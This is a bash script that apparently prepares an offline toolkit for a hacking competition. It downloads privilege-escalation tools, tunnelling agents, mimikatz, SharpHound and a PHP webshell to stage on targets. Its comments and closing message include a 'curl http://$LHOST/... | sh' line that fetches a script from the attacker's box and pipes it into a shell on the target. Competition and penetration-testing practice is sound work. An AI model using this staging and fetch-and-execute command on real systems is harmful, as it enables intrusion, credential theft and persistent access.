#!/usr/bin/env bash
# Build the OFFLINE ARSENAL — static binaries/scripts you drop on targets,
# mirroring Exegol's exegol-resources/. Fetch BEFORE the competition (needs
# internet); then serve them to targets offline from your box:
#
#   www                 # alias: cd $CC_HOME/resources && python3 -m http.server 80
#   # on target:  curl http://$LHOST/linux/linpeas.sh | sh
#
# Idempotent: existing files are skipped unless you pass --force.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$HERE/.." && pwd)"
# shellcheck source=../lib/common.sh
source "$ROOT/lib/common.sh"
# shellcheck source=../lib/fetch.sh
source "$ROOT/lib/fetch.sh"

FORCE=0; [ "${1:-}" = "--force" ] && FORCE=1
LNX="$HERE/linux"; WIN="$HERE/windows"; WEB="$HERE/webshells"
mkdir -p "$LNX" "$WIN" "$WEB"

# skip if present (unless --force); else run the given fetch command ("$@").
_get() {
  local dest="$1"; shift
  if [ "$FORCE" -eq 0 ] && [ -s "$dest" ]; then ok "have $(basename "$dest")"; return 0; fi
  "$@"
}

step "linux drops -> $LNX"
_get "$LNX/linpeas.sh"  fetch_ghlatest peass-ng/PEASS-ng linpeas.sh "$LNX/linpeas.sh"
_get "$LNX/pspy64"      fetch_ghlatest DominicBreuker/pspy pspy64   "$LNX/pspy64"
_get "$LNX/pspy32"      fetch_ghlatest DominicBreuker/pspy pspy32   "$LNX/pspy32"
_get "$LNX/lse.sh"      fetch_url https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh "$LNX/lse.sh"
_get "$LNX/les.sh"      fetch_url https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh "$LNX/les.sh"
_get "$LNX/deepce.sh"   fetch_url https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh "$LNX/deepce.sh"
_get "$LNX/ncat"        fetch_url https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat "$LNX/ncat"
_get "$LNX/chisel"      fetch_gh_gz jpillora/chisel 'chisel_[0-9.]+_linux_amd64\.gz$' "$LNX/chisel"
_get "$LNX/ligolo-agent" fetch_gh_tar_member nicocha30/ligolo-ng 'ligolo-ng_agent_.*_linux_amd64\.tar\.gz$' 'agent' "$LNX/ligolo-agent"
chmod +x "$LNX"/* 2>/dev/null || true

step "windows drops -> $WIN"
_get "$WIN/winPEASx64.exe"  fetch_ghlatest peass-ng/PEASS-ng winPEASx64.exe "$WIN/winPEASx64.exe"
_get "$WIN/PrintSpoofer64.exe" fetch_ghlatest itm4n/PrintSpoofer PrintSpoofer64.exe "$WIN/PrintSpoofer64.exe"
_get "$WIN/GodPotato-NET4.exe" fetch_ghlatest BeichenDream/GodPotato GodPotato-NET4.exe "$WIN/GodPotato-NET4.exe"
_get "$WIN/PrivescCheck.ps1" fetch_url https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 "$WIN/PrivescCheck.ps1"
_get "$WIN/PowerView.ps1"   fetch_url https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 "$WIN/PowerView.ps1"
_get "$WIN/PowerUp.ps1"     fetch_url https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 "$WIN/PowerUp.ps1"
_get "$WIN/chisel.exe" fetch_gh_gz jpillora/chisel 'chisel_[0-9.]+_windows_amd64\.gz$' "$WIN/chisel.exe"
_get "$WIN/ligolo-agent-win.zip" fetch_gh_asset_match nicocha30/ligolo-ng 'ligolo-ng_agent_.*_windows_amd64\.zip$' "$WIN/ligolo-agent-win.zip"
_get "$WIN/mimikatz.zip"    fetch_ghlatest gentilkiwi/mimikatz mimikatz_trunk.zip "$WIN/mimikatz.zip"
_get "$WIN/SharpHound.zip"  fetch_gh_asset_match BloodHoundAD/SharpHound 'SharpHound-v.*\.zip$' "$WIN/SharpHound.zip"

step "webshells -> $WEB"
_get "$WEB/p0wny-shell.php" fetch_url https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php "$WEB/p0wny-shell.php"

step "done"
info "serve the arsenal:  www   (then on target: curl http://\$LHOST/linux/linpeas.sh | sh)"
ls -R "$HERE" | sed 's/^/  /' | head -60
